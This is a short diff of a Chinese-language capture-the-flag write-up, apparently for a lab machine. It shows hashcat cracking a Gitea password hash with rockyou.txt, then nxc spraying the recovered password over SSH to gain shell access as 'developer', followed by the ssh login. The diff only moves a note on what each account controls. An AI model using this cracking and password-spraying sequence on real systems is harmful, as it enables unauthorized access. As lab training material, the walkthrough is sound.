@@ -117,17 +117,14 @@ $ hashcat titanic.gitea rockyou.txt
 ```
 ![beautiful day](images/080308.png)
 密码为25282528
-
-用户名        	  来源	              密码哈希用途
-
-administrator  	Gitea admin 用户  	破解后可用于控制整个平台
-
-developer	      开发者账户	        破解后可能用于实际系统访问权限
 #### 使用 nxc 来 对多个用户名尝试同一个密码
 ```
 $ nxc ssh 10.129.231.221 -u user -p '25282528'
+
 SSH     10.129.231.221 22     10.129.231.221    [+] developer:25282528 Linux - Shell access!
 ```
+administrator 为 Gitea admin 用户：	破解后可用于控制整个平台｜developer 为 开发者账户：破解后可能用于实际系统访问权限
+
 就可以开始远程登陆了
 ```
 $ ssh developer@10.129.231.221
